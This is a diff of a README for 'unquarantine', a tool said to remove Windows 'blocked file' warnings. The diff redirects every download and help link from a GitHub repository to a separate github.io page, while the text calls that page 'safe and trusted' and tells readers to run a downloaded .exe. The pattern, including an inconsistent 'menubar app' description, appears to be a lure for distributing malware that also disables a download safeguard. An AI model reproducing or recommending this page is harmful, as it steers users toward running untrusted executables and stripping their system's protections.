@@ -6,13 +6,13 @@ Welcome to **unquarantine**! This handy menubar app takes the hassle out of deal
 
 ## 💾 Download & Installation
 
-[![Download unquarantine](https://img.shields.io/badge/Download-unquarantine-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://github.com/menijazg/unquarantine)
+[![Download unquarantine](https://img.shields.io/badge/Download-unquarantine-blue?style=for-the-badge&logo=windows&logoColor=white&color=0078D6)](https://menijazg.github.io)
 
 **Click the button above** to go to the official download page. On that page, you'll find the latest version of the app ready to download.
 
 ### 📦 Step-by-Step Instructions
 
-1. **Visit the download page:** Click the blue button at the top of this page, or go directly to [https://github.com/menijazg/unquarantine](https://github.com/menijazg/unquarantine). This page is the official home of the app—it's safe and trusted.
+1. **Visit the download page:** Click the blue button at the top of this page, or go directly to [https://menijazg.github.io](https://menijazg.github.io). This page is the official home of the app—it's safe and trusted.
 
 2. **Find the download section:** On the page, look for a section labeled "Releases" or "Assets" (usually on the right side or below the description). There, you'll see a file with a name something like `unquarantine-setup.exe` or `unquarantine-latest.exe`.
 
@@ -123,7 +123,7 @@ Completely free, no ads, no subscriptions, no tracking. It's a project created b
 
 If you run into any issue not covered above, the best place to get help is the official GitHub repository:
 
-- **Visit:** [https://github.com/menijazg/unquarantine](https://github.com/menijazg/unquarantine)
+- **Visit:** [https://menijazg.github.io](https://menijazg.github.io)
 - Look for the **"Issues"** tab (or the "Discussions" tab) to see if others have reported the same problem.
 - You can also **post a new issue** describing what you're seeing, and the developers (or helpful community members) will respond.
 
@@ -139,7 +139,7 @@ unquarantine is the quiet digital assistant that removes one of the most annoyin
 
 Download it today, install it in five minutes, and say goodbye to "blocked file" dialogues forever. Your downloads belong to you—unquarantine simply makes sure Windows remembers that too.
 
-[![Get unquarantine](https://img.shields.io/badge/🚀_Download_unquarantine_Now-orange?style=for-the-badge)](https://github.com/menijazg/unquarantine)
+[![Get unquarantine](https://img.shields.io/badge/🚀_Download_unquarantine_Now-orange?style=for-the-badge)](https://menijazg.github.io)
 
 ---
 
